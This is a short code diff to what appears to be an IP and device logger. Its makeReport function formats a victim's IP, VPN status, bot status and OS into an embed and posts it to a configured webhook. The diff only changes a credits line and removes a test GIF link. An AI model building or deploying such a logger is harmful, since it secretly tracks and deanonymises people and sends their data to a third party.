@@ -162,7 +162,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`  
-> **credits** THIS TOOL IS MADE BY TG ACE 
+> **credits** `THIS TOOL IS MADE BY TG ACE` 
 
 **PC Info:**
 > **OS:** `{os}`
@@ -175,8 +175,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     }
   ],
 }
-**test**
- > https://tenor.com/view/cars-gif-9831011217898319596 
+
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
